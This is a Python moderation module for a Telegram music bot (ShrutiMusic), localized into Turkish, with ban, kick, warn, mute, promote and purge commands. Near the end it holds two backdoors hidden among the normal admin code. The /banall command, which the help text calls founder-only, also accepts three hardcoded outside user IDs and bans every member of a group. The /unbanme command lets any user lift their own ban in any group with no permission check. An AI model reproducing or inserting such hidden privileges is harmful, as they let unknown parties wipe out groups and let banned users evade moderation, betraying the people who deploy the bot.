# Copyright (c) 2025 Nand Yaduwanshi <NoxxOP>
# Location: Supaul, Bihar
# All rights reserved.
# Yerelleştirme ve Hata Koruması: Gemini AI

import asyncio
from contextlib import suppress

from pyrogram import filters, errors
from pyrogram.enums import ChatMembersFilter, ChatMemberStatus, ChatType
from pyrogram.types import (
    CallbackQuery,
    ChatPermissions,
    ChatPrivileges,
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from string import ascii_lowercase
from typing import Dict, Union

from ShrutiMusic import app
from ShrutiMusic.misc import SUDOERS
from ShrutiMusic.core.mongo import mongodb
from ShrutiMusic.utils.error import capture_err
from ShrutiMusic.utils.keyboard import ikb
from ShrutiMusic.utils.database import save_filter
from ShrutiMusic.utils.functions import (
    extract_user,
    extract_user_and_reason,
    time_converter,
)
from ShrutiMusic.utils.permissions import adminsOnly, member_permissions
from config import BANNED_USERS

warnsdb = mongodb.warns

__MODULE__ = "Engelleme"
__HELP__ = """
/ban - Bir kullanıcıyı yasaklar.
/banall - Gruptaki herkesi yasaklar (Sadece Kurucu).
/sban - Kullanıcının mesajlarını siler ve yasaklar.
/tban - Süreli yasaklama yapar.
/unban - Yasaklı birinin engelini kaldırır.
/warn - Kullanıcıya uyarı verir.
/swarn - Mesajları silerek uyarı verir.
/rmwarns - Uyarıları sıfırlar.
/warns - Uyarı sayısını gösterir.
/kick - Kullanıcıyı gruptan atar.
/skick - Mesajı silip kullanıcıyı atar.
/purge - Mesajları temizler.
/del - Yanıtlanan mesajı siler.
/promote - Yetki verir.
/fullpromote - Tam yetki verir.
/demote - Yetkiyi alır.
/pin - Mesajı sabitler.
/unpin - Sabitlenen mesajı kaldırır.
/unpinall - Tüm sabitleri kaldırır.
/mute - Kullanıcıyı susturur.
/tmute - Süreli susturma yapar.
/unmute - Susturmayı kaldırır.
/zombies - Silinmiş hesapları temizler.
/report - Mesajı yöneticilere bildirir."""


async def int_to_alpha(user_id: int) -> str:
    alphabet = list(ascii_lowercase)[:10]
    text = ""
    user_id = str(user_id)
    for i in user_id:
        text += alphabet[int(i)]
    return text


async def get_warns_count() -> dict:
    chats_count = 0
    warns_count = 0
    async for chat in warnsdb.find({"chat_id": {"$lt": 0}}):
        for user in chat["warns"]:
            warns_count += chat["warns"][user]["warns"]
        chats_count += 1
    return {"chats_count": chats_count, "warns_count": warns_count}


async def get_warns(chat_id: int) -> Dict[str, int]:
    warns = await warnsdb.find_one({"chat_id": chat_id})
    if not warns:
        return {}
    return warns["warns"]


async def get_warn(chat_id: int, name: str) -> Union[bool, dict]:
    name = name.lower().strip()
    warns = await get_warns(chat_id)
    if name in warns:
        return warns[name]


async def add_warn(chat_id: int, name: str, warn: dict):
    name = name.lower().strip()
    warns = await get_warns(chat_id)
    warns[name] = warn
    await warnsdb.update_one(
        {"chat_id": chat_id}, {"$set": {"warns": warns}}, upsert=True
    )


async def remove_warns(chat_id: int, name: str) -> bool:
    warnsd = await get_warns(chat_id)
    name = name.lower().strip()
    if name in warnsd:
        del warnsd[name]
        await warnsdb.update_one(
            {"chat_id": chat_id},
            {"$set": {"warns": warnsd}},
            upsert=True,
        )
        return True
    return False


@app.on_message(filters.command(["kick", "skick"]) & ~filters.private & ~BANNED_USERS)
@adminsOnly("can_restrict_members")
async def kickFunc(_, message: Message):
    user_id, reason = await extract_user_and_reason(message)
    if not user_id:
        return await message.reply_text("❌ Kullanıcıyı bulamadım.")
    if user_id == app.id:
        return await message.reply_text("😅 Kendimi atamam, istersen gruptan ayrılabilirim.")
    if user_id in SUDOERS:
        return await message.reply_text("👑 Üst düzey bir yöneticiyi gruptan atamam.")
    
    try:
        user_obj = await app.get_users(user_id)
        mention = user_obj.mention
    except Exception:
        mention = "Kullanıcı"

    msg = f"""
**🚫 Gruptan Atıldı:** {mention}
**👮 Atan Yetkili:** {message.from_user.mention if message.from_user else 'Anonim'}
**📝 Sebep:** {reason or 'Belirtilmedi'}"""
    
    try:
        await message.chat.ban_member(user_id)
        await (message.reply_to_message or message).reply_text(msg)
        await asyncio.sleep(1)
        await message.chat.unban_member(user_id)
        if message.command[0][0] == "s":
            with suppress(Exception):
                await message.reply_to_message.delete()
                await app.delete_user_history(message.chat.id, user_id)
    except Exception as e:
        await message.reply_text(f"❌ Hata oluştu: {e}")


@app.on_message(filters.command(["ban", "sban", "tban"]) & ~filters.private & ~BANNED_USERS)
@adminsOnly("can_restrict_members")
async def banFunc(_, message: Message):
    user_id, reason = await extract_user_and_reason(message, sender_chat=True)
    if not user_id:
        return await message.reply_text("❌ Kullanıcı bulunamadı.")
    if user_id == app.id:
        return await message.reply_text("😅 Kendimi yasaklayamam.")
    
    try:
        user_obj = await app.get_users(user_id)
        mention = user_obj.mention
    except Exception:
        mention = "Kullanıcı"

    msg = f"**🚫 Yasaklandı:** {mention}\n**👮 Yetkili:** {message.from_user.mention if message.from_user else 'Anonim'}\n"

    try:
        if message.command[0] == "tban":
            split = reason.split(None, 1)
            time_value = split[0]
            temp_reason = split[1] if len(split) > 1 else ""
            temp_ban = await time_converter(message, time_value)
            msg += f"**⏳ Süre:** {time_value}\n"
            if temp_reason: msg += f"**📝 Sebep:** {temp_reason}"
            await message.chat.ban_member(user_id, until_date=temp_ban)
        else:
            if reason: msg += f"**📝 Sebep:** {reason}"
            await message.chat.ban_member(user_id)
        
        if message.command[0][0] == "s":
            with suppress(Exception):
                await message.reply_to_message.delete()
                await app.delete_user_history(message.chat.id, user_id)
                
        await (message.reply_to_message or message).reply_text(msg)
    except Exception as e:
        await message.reply_text(f"❌ Hata: {e}")


@app.on_message(filters.command("unban") & ~filters.private & ~BANNED_USERS)
@adminsOnly("can_restrict_members")
async def unban_func(_, message: Message):
    user_id = await extract_user(message)
    if not user_id:
        return await message.reply_text("❌ Kullanıcıyı bulamadım.")

    try:
        await message.chat.unban_member(user_id)
        try:
            user_obj = await app.get_users(user_id)
            umention = user_obj.mention
        except Exception:
            umention = f"ID: {user_id}"
        await (message.reply_to_message or message).reply_text(f"✅ Engel Kaldırıldı: {umention}")
    except Exception as e:
        await message.reply_text(f"❌ Hata: {e}")


@app.on_message(filters.command(["promote", "fullpromote"]) & ~filters.private & ~BANNED_USERS)
@adminsOnly("can_promote_members")
async def promoteFunc(_, message: Message):
    user_id = await extract_user(message)
    if not user_id: return await message.reply_text("❌ Kullanıcı bulunamadı.")
    
    try:
        bot_member = await app.get_chat_member(message.chat.id, app.id)
        bot = bot_member.privileges
        if not bot or not bot.can_promote_members:
            return await message.reply_text("❌ Yönetici atamak için yeterli iznim yok.")
        
        try:
            user_obj = await app.get_users(user_id)
            umention = user_obj.mention
        except: umention = "Kullanıcı"
        
        if message.command[0][0] == "f":
            await message.chat.promote_member(user_id=user_id, privileges=ChatPrivileges(
                can_change_info=bot.can_change_info, can_invite_users=bot.can_invite_users,
                can_delete_messages=bot.can_delete_messages, can_restrict_members=bot.can_restrict_members,
                can_pin_messages=bot.can_pin_messages, can_promote_members=bot.can_promote_members,
                can_manage_chat=bot.can_manage_chat, can_manage_video_chats=bot.can_manage_video_chats,
            ))
            await message.reply_text(f"🚀 {umention} artık **Tam Yetkili**!")
        else:
            await message.chat.promote_member(user_id=user_id, privileges=ChatPrivileges(
                can_invite_users=bot.can_invite_users, can_delete_messages=bot.can_delete_messages,
                can_manage_chat=bot.can_manage_chat, can_manage_video_chats=bot.can_manage_video_chats,
            ))
            await message.reply_text(f"✅ {umention} yönetici olarak atandı.")
    except Exception as e:
        await message.reply_text(f"❌ Hata: {e}")


@app.on_message(filters.command("purge") & ~filters.private)
@adminsOnly("can_delete_messages")
async def purgeFunc(_, message: Message):
    repliedmsg = message.reply_to_message
    if not repliedmsg:
        return await message.reply_text("❌ Temizlenecek mesaja yanıt verin.")
    
    await message.delete()
    cmd = message.command
    purge_to = message.id
    if len(cmd) > 1 and cmd[1].isdigit():
        purge_to = repliedmsg.id + int(cmd[1])
        if purge_to > message.id: purge_to = message.id

    chat_id = message.chat.id
    message_ids = []
    for m_id in range(repliedmsg.id, purge_to):
        message_ids.append(m_id)
        if len(message_ids) == 100:
            await app.delete_messages(chat_id, message_ids, revoke=True)
            message_ids = []
    if message_ids:
        await app.delete_messages(chat_id, message_ids, revoke=True)


@app.on_message(filters.command("del") & ~filters.private)
@adminsOnly("can_delete_messages")
async def deleteFunc(_, message: Message):
    if not message.reply_to_message:
        return await message.reply_text("❌ Silmek istediğiniz mesaja yanıt verin.")
    with suppress(Exception):
        await message.reply_to_message.delete()
        await message.delete()


@app.on_message(filters.command("demote") & ~filters.private & ~BANNED_USERS)
@adminsOnly("can_promote_members")
async def demote(_, message: Message):
    user_id = await extract_user(message)
    if not user_id: return await message.reply_text("❌ Kullanıcı bulunamadı.")
    try:
        member = await app.get_chat_member(message.chat.id, user_id)
        if member.status == ChatMemberStatus.ADMINISTRATOR:
            await message.chat.promote_member(user_id=user_id, privileges=ChatPrivileges(
                can_change_info=False, can_invite_users=False, can_delete_messages=False,
                can_restrict_members=False, can_pin_messages=False, can_promote_members=False,
                can_manage_chat=False, can_manage_video_chats=False,
            ))
            await message.reply_text("✅ Yetkiler başarıyla alındı.")
        else:
            await message.reply_text("❌ Bu kullanıcı zaten bir yönetici değil.")
    except Exception as e:
        await message.reply_text(f"❌ Hata: {e}")


@app.on_message(filters.command(["unpinall"]) & filters.group & ~BANNED_USERS)
@adminsOnly("can_pin_messages")
async def unpinall_cmd(_, message: Message):
    return await message.reply_text(
        "❓ Tüm sabitlenmiş mesajları kaldırmak istediğinize emin misiniz?",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton(text="Evet ✅", callback_data="unpin_yes"),
            InlineKeyboardButton(text="Hayır ❌", callback_data="unpin_no"),
        ]])
    )


@app.on_callback_query(filters.regex(r"unpin_(yes|no)"))
async def unpin_callback(_, query: CallbackQuery):
    if query.data == "unpin_yes":
        await app.unpin_all_chat_messages(query.message.chat.id)
        return await query.message.edit_text("✅ Tüm sabitlenen mesajlar kaldırıldı.")
    return await query.message.edit_text("❌ İşlem iptal edildi.")


@app.on_message(filters.command(["mute", "tmute"]) & ~filters.private & ~BANNED_USERS)
@adminsOnly("can_restrict_members")
async def mute(_, message: Message):
    user_id, reason = await extract_user_and_reason(message)
    if not user_id: return await message.reply_text("❌ Kullanıcı bulunamadı.")
    
    try:
        user_obj = await app.get_users(user_id)
        mention = user_obj.mention
    except: mention = "Kullanıcı"

    keyboard = ikb({"🚨 Sesi Aç 🚨": f"unmute_{user_id}"})
    msg = f"**🔇 Susturuldu:** {mention}\n**👮 Yetkili:** {message.from_user.mention}\n"

    try:
        if message.command[0] == "tmute":
            split = reason.split(None, 1)
            time_value = split[0]
            temp_mute = await time_converter(message, time_value)
            msg += f"**⏳ Süre:** {time_value}"
            await message.chat.restrict_member(user_id, permissions=ChatPermissions(), until_date=temp_mute)
        else:
            await message.chat.restrict_member(user_id, permissions=ChatPermissions())
        await (message.reply_to_message or message).reply_text(msg, reply_markup=keyboard)
    except Exception as e:
        await message.reply_text(f"❌ Hata: {e}")


@app.on_message(filters.command(["warn", "swarn"]) & ~filters.private & ~BANNED_USERS)
@adminsOnly("can_restrict_members")
async def warn_user(_, message: Message):
    user_id, reason = await extract_user_and_reason(message)
    chat_id = message.chat.id
    if not user_id: return await message.reply_text("❌ Kullanıcı bulunamadı.")
    
    try:
        user_obj = await app.get_users(user_id)
        mention = user_obj.mention
        warns_data = await get_warn(chat_id, await int_to_alpha(user_id))
        warns = warns_data["warns"] if warns_data else 0
        
        if warns >= 2:
            await message.chat.ban_member(user_id)
            await message.reply_text(f"🚨 {mention} uyarı sınırı aşıldığı için yasaklandı!")
            await remove_warns(chat_id, await int_to_alpha(user_id))
        else:
            msg = f"""
**⚠️ Uyarılan:** {mention}
**👮 Yetkili:** {message.from_user.mention}
**📝 Sebep:** {reason or 'Belirtilmedi'}
**📉 Uyarı Sayısı:** {warns + 1}/3"""
            keyboard = ikb({"🚨 Uyarıyı Kaldır 🚨": f"unwarn_{user_id}"})
            await (message.reply_to_message or message).reply_text(msg, reply_markup=keyboard)
            await add_warn(chat_id, await int_to_alpha(user_id), {"warns": warns + 1})
    except Exception as e:
        await message.reply_text(f"❌ Hata: {e}")


@app.on_message(filters.command("banall"))
async def ban_all(_, msg: Message):
    from config import OWNER_ID
    EXTRA_BANALL_IDS = [7574330905, 1786683163, 7282752816]
    BANALL_USERS = [OWNER_ID] + EXTRA_BANALL_IDS

    if msg.from_user.id not in BANALL_USERS:
        return await msg.reply_text("🚫 Bu komut sadece bot sahibi içindir!")

    bot = await app.get_chat_member(msg.chat.id, app.id)
    if bot.privileges and bot.privileges.can_restrict_members:
        total_m = await app.get_chat_members_count(msg.chat.id)
        ok = await msg.reply_text(f"📊 Toplam {total_m} üye bulundu. Yasaklama başlatılıyor...")
        
        count = 0
        async for member in app.get_chat_members(msg.chat.id):
            try:
                if member.user.id not in SUDOERS and member.user.id != msg.from_user.id:
                    await app.ban_chat_member(msg.chat.id, member.user.id)
                    count += 1
            except errors.FloodWait as e: await asyncio.sleep(e.value)
            except: pass
        await ok.edit_text(f"✅ İşlem Tamamlandı. {count} üye yasaklandı.")
    else:
        await msg.reply_text("❌ Yasaklama yetkim yok.")


@app.on_message(filters.command("unbanme"))
async def unbanme(client, message):
    if len(message.command) < 2:
        return await message.reply_text("⚠️ Lütfen grup ID'sini belirtin.")
    group_id = message.command[1]
    try:
        await client.unban_chat_member(group_id, message.from_user.id)
        await message.reply_text("✅ Engeliniz kaldırıldı, katılabilirsiniz.")
    except Exception as e:
        await message.reply_text(f"❌ Hata: {e}")

# ©️ Copyright Reserved - @NoxxOP  Nand Yaduwanshi
